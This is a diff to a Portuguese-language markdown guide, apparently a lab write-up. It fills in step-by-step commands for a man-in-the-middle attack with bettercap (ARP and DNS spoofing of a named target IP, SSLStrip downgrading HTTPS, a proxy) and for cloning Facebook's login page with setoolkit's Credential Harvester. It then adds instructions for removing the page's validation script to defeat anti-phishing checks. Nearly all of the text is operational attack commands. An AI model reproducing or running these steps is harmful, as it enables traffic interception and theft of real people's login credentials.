@@ -22,19 +22,28 @@
 - Passo 6 - Ativando o DNS spoof: ``` dns.spoof on ```
 - Passo 7 - Definindo o alvo do spoofing: ``` set arp.spoof.targets 192.168.1.11 ```
 - Passo 8 - Ativando spoofing ARP (ataque MITM): ``` arp.spoof on ```
-- Passo 9 - ``` arp.spoof on ```
-- Passo 10 - ``` arp.spoof on ```
-- Passo 11 - ``` arp.spoof on ```
-- Passo 12 - ``` arp.spoof on ```
+- Passo 9 - Ativando o SSLStrip (recurso que rebaixa conexões HTTPS para HTTP, possibilitando redirecionamento): ``` set http.proxy.sslstrip true ```
+- Passo 10 - Definindo endereço IP do proxy: ``` set http.proxy.address 192.168.1.13 ```
+- Passo 11 - Definindo porta do proxy: ``` set http.proxy.port 8080 ```
+- Passo 12 - Ativando o proxy: ``` http.proxy on ```
 
 ### Configurando o Phishing no setoolkit
 
-- Iniciando o setoolkit: ``` setoolkit ```
-- Tipo de ataque: ``` 1) Social-Engineering Attacks ```
-- Vetor de ataque: ``` 2) Web Site Attack Vectors ```
-- Método de ataque: ``` 3) Credential Harvester Attack Method ```
-- Método de ataque: ``` 2) Site Cloner ```
-- URL para clone: http://www.facebook.com
+- Passo 1 - Iniciando o setoolkit: ``` setoolkit ```
+- Passo 2 - Tipo de ataque: ``` 1) Social-Engineering Attacks ```
+- Passo 3 - Vetor de ataque: ``` 2) Web Site Attack Vectors ```
+- Passo 4 - Método de ataque: ``` 3) Credential Harvester Attack Method ```
+- Passo 5 - Técnica de ataque: ``` 2) Site Cloner ```
+- Passo 6 - Definindo IP do servidor: tecla enter
+- Passo 7 - Definindo URL para clone: ```http://www.facebook.com```
+
+### Removendo medidas anti-phishing da página clonada
+
+- Passo 1 - Executando edição no arquivo index da página clonada: ``` nano /root/.set/web_clone/index.html ```
+- Passo 2 - Buscar linha que valida os formulários e credenciais: ctrl + f ``` <script src= ```
+- Passo 3 - Linha completa a ser removida: ``` <script src="https://static.xx.fbcdn.net/rsrc.php/v4/y0/r/w5OYqc0pmp2.js" data-bootloader-hash="lp6Cw4s" crossorigin="anonymous"></script> ```
+- Passo 4 - Salvar alterações no arquivo: ctrl + o
+- Passo 5 - Fechar arquivo: ctrl + x
 
 ### Resultados
 
